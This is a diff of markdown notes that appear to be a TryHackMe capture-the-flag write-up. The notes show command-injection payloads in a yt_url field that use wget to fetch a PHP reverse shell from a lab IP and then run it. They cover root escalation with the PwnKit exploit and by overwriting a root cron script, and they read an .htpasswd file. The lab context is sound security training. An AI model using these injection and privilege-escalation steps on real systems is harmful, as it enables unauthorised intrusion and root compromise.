@@ -109,9 +109,10 @@ yt_url=`wget${IFS}http://10.4.18.63/rev.php`
 yt_url=`php${IFS}rev.php`
 ```
 
-# privesc to root
+# root shell
 #pwnkit #kernel_exploit #linux_kernel_exploit #linux_kernel
-PwnKit
+## Method 1 
+Using PwnKit
 https://github.com/ly4k/PwnKit
 ```
 $ whoami
@@ -120,7 +121,11 @@ $ ./pwnkit
 # whomi
 root
 ```
-# use that can access /admin dir
+## Method 2
+overwrite `clean.sh` which is run by root user every minute and get a root shell
+
+# TryHackMe objective
+user who can access `/admin` dir:
 ```
 # user who can access this directory is found here
 $ cat /var/www/html/admin/.htpasswd
